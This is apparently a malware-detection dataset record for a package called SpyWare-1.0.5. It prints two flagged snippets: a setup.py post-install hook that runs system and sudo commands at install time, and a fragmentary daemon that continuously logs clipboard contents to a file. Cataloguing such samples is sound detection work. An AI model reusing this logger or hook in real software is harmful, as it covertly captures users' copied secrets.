[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "from sys import maxsize, executable, version_info\nfrom setuptools.command.install import install\nfrom os import system as exec_command\nfrom platform import system\n\nclass PostInstallScript(install):\n    \"\"\"\n    This class install the PyAudio module.\n    \"\"\"\n\n    def is_64bit(self) -> bool:\n        \"\"\"\n        This function returns True if python is in x64 else returns False.\n        \"\"\"\n        return maxsize > 2 ** 32\n\n    def install_pyaudio(self):\n        \"\"\"\n        This function install the PyAudio module.\n        \"\"\"\n        if system() == \"Windows\":\n            v = f\"{version_info.major}{version_info.minor}\"\n            whl_file = (\n                f\"PyAudio-0.2.11-cp{v}-cp{v}-win_amd64.whl\"\n                if self.is_64bit()\n                else f\"PyAudio-0.2.11-cp{v}-cp{v}-win32.whl\"\n            )\n            exec_command(f'\"{executable}\" -m pip install \"{whl_file}\"')\n        else:\n            exec_command(\"sudo apt-get install portaudio19-dev python-pyaudio\")\n            packages.append(\"pyaudio\")\n\n    def run(self):\n        \"\"\"\n        Install the package.\n        \"\"\"\n        self.install_pyaudio()\n        install.run(self)\n"
  },
  {
    "pyfile": "ClipboardLogger.py",
    "malicious_code_snippets": "from pyperclip import paste\nfrom time import sleep\n\nclass Daemon:\n    \"\"\"\n    This class implements a loop to get clipboard for ever.\n    \"\"\"\n\n    def __init__(self):\n        self.internval = CONFIGURATIONS.internval\n        path = self.path = CONFIGURATIONS.save_filename\n        create_if_not_exists(path)\n        self.data_file = open(path)\n        self.data = \"\"\n        self.run = True\n\n    def run_for_ever(self) -> None:\n        \"\"\"\n        This function implements a loop to get clipboard for ever.\n        \"\"\"\n        persistent_save = self.persistent_save\n        internval = self.internval\n        save = self.save\n        counter = 0\n\n        while self.run:\n            clipboard = paste()\n            counter += 1\n\n            if len(clipboard) > 75:\n                clipboard = \"\"\n            else:\n                save(clipboard)\n\n            if counter >= 150:\n                persistent_save()\n                counter = 0\n\n            if self.run:\n                sleep(internval)\n\n    def save(self, clipboard: str) -> None:\n        \"\"\"\n        This function saves clipboard if isn't save before.\n        \"\"\"\n        clipboard = f\"{repr(clipboard)}\\n\"\n        data_file = self.data_file\n        data_file.seek(0)\n        readline = data_file.readline\n        data = readline()\n        if clipboard in self.data:\n            return None\n        while data:\n            if clipboard == data:\n                return None\n            data = readline()\n        self.data += clipboard\n\n    def persistent_save(self) -> None:\n        \"\"\"\n        This function saves data in file.\n        \"\"\"\n        path = self.path\n        self.data_file.close()\n        with open(path, \"a\") as file:\n            file.write(self.data)\n        self.data = \"\"\n        self.data_file = open(path)\n\ndef create_if_not_exists(filename: str) -> None:\n    \"\"\"\n    This function creates file if not exists.\n    \"\"\"\n    if not exists(filename):\n        file = open(filename, \"w\")\n        file.write(\"\")\n        file.close()\n\ndef main(config_filename: str = None, argv: List[str] = argv) -> int:\n    \"\"\"\n    This function starts the clipboard logger.\n    \"\"\"\n    config_load(filename=config_filename, argv=argv)\n    daemon = Daemon()\n    try:\n        daemon.run_for_ever()\n    except KeyboardInterrupt:\n        daemon.run = False\n    return 0\n\nif __name__ == \"__main__\":\n    print(copyright)\n    exit(main())"
  },
  {
    "metadata": {
      "package_name": "SpyWare-1.0.5",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/SpyWare-1.0.5.txt"
    }
  }
]